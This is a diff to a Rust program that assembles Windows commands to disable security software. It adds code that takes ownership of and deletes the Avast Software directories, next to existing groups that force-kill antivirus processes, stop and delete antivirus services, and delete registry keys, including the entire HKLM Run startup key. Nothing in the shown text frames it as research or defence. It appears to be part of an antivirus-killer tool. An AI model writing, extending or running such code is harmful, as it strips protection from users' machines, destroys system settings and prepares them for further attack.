@@ -862,7 +862,21 @@ fn main() -> io::Result<()> {
             add_takeown_and_delete(&mut commands, &wd_pd);
         }
 
-        // Group 8: Kill antivirus processes
+        // Group 8: Delete Avast Software directories.
+        if let Ok(prog_files) = env::var("ProgramFiles") {
+            let avast_pf = format!(r#""{}\Avast Software""#, prog_files);
+            add_takeown_and_delete(&mut commands, &avast_pf);
+        }
+        if let Ok(prog_files_x86) = env::var("ProgramFiles(x86)") {
+            let avast_pf86 = format!(r#""{}\Avast Software""#, prog_files_x86);
+            add_takeown_and_delete(&mut commands, &avast_pf86);
+        }
+        if let Ok(program_data) = env::var("ProgramData") {
+            let avast_pd = format!(r#""{}\Avast Software""#, program_data);
+            add_takeown_and_delete(&mut commands, &avast_pd);
+        }
+
+        // Group 9: Kill antivirus processes
         let kill_processes_cmds = vec![
             // AVAST
             "taskkill /F /IM AvastSvc.exe /T",
@@ -878,7 +892,7 @@ fn main() -> io::Result<()> {
             commands.push(cmd.to_string());
         }
 
-        // Group 9: Stop antivirus services
+        // Group 10: Stop antivirus services
         let stop_services_cmds = vec![
             // Avast
             "sc stop AvastSvc",
@@ -898,7 +912,7 @@ fn main() -> io::Result<()> {
             commands.push(cmd.to_string());
         }
 
-        // Group 10: Delete antivirus services
+        // Group 11: Delete antivirus services
         let delete_services_cmds = vec![
             // Avast
             "sc delete AvastSvc",
@@ -918,7 +932,7 @@ fn main() -> io::Result<()> {
             commands.push(cmd.to_string());
         }
 
-        // Group 11: Delete registry keys for antivirus programs.
+        // Group 12: Delete registry keys for antivirus programs.
         let delete_registry_cmds = vec![
             // Startup keys
             r#"reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f"#,
